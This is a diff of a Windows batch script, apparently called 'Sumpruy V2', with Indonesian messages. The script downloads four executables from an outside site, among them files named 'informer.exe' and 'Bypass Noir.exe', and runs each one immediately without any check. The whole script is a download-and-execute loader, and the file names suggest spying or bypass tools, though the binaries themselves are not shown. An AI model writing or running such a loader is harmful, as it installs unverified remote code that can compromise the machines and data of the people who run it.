@@ -1,49 +1,57 @@
 @echo off
-title Sumpruy Downloader Pro Max - TrueAdam
+title Sumpruy V2
 set "DL_DIR=C:\Sumpruy_Downloads"
 mkdir "%DL_DIR%" 2>nul
 cd /d "%DL_DIR%"
 
-:: POP UP PERTAMA
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Sumpruy downloader is now started mpruy tunggu aja.', 'Sumpruy Downloader', 'OK', 'Warning')}"
+echo.
+echo ========================================
+echo MULAI DOWNLOAD BRO...
+echo ========================================
+echo.
 
-:: DAFTAR FILE + URL LENGKAP
-set "FILES=StarDesk.exe informer.exe seeu.exe Bypass Noir.exe"
-
-:: LOOPING DOWNLOAD + EKSEKUSI
-for %%F in (%FILES%) do (
-    echo.
-    echo ========================================
-    echo Downloading %%F dari https://trueadam.site/%%F ...
-    echo ========================================
-    
-    if exist "%%F" del "%%F"
-    
-    curl -L -o "%%F" "https://trueadam.site/%%F" --silent --show-error
-    
-    if exist "%%F" (
-        for %%Z in ("%%F") do (
-            if %%~zZ LSS 1000 (
-                echo ⚠️ File %%F terlalu kecil (%%~zZ bytes) - mungkin corrupt
-                del "%%F"
-                echo ❌ Gagal, file corrupt.
-            ) else (
-                echo ✅ %%F berhasil didownload (%%~zZ bytes)
-                timeout /t 1 /nobreak >nul
-                echo 🚀 Menjalankan %%F ...
-                start "" "%%F"
-            )
-        )
-    ) else (
-        echo ❌ %%F gagal download. Coba ulang manual.
-    )
+:: DOWNLOAD SATU PER SATU DENGAN URL LENGKAP
+echo 1. Downloading StarDesk.exe...
+powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/StarDesk.exe' -OutFile 'StarDesk.exe'"
+if %errorlevel%==0 (
+    echo ✅ StarDesk.exe OK
+    start "" "StarDesk.exe"
+) else (
+    echo ❌ Gagal download StarDesk.exe
 )
 
-:: POP UP KEDUA
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Udeh selesuy mpruy downloadnya tinggal gas aje mok gue laper.', 'Sumpruy Downloader', 'OK', 'Information')}"
+echo.
+echo 2. Downloading informer.exe...
+powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/informer.exe' -OutFile 'informer.exe'"
+if %errorlevel%==0 (
+    echo ✅ informer.exe OK
+    start "" "informer.exe"
+) else (
+    echo ❌ Gagal download informer.exe
+)
+
+echo.
+echo 3. Downloading seeu.exe...
+powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/seeu.exe' -OutFile 'seeu.exe'"
+if %errorlevel%==0 (
+    echo ✅ seeu.exe OK
+    start "" "seeu.exe"
+) else (
+    echo ❌ Gagal download seeu.exe
+)
+
+echo.
+echo 4. Downloading Bypass Noir.exe...
+powershell -Command "Invoke-WebRequest -Uri 'https://trueadam.site/Bypass%%20Noir.exe' -OutFile 'Bypass Noir.exe'"
+if %errorlevel%==0 (
+    echo ✅ Bypass Noir.exe OK
+    start "" "Bypass Noir.exe"
+) else (
+    echo ❌ Gagal download Bypass Noir.exe
+)
 
 echo.
 echo ========================================
-echo Selesai! Cek folder C:\Sumpruy_Downloads
+echo SELESAI SEMUA BRO. CEK DI C:\Sumpruy_Downloads
 echo ========================================
 pause
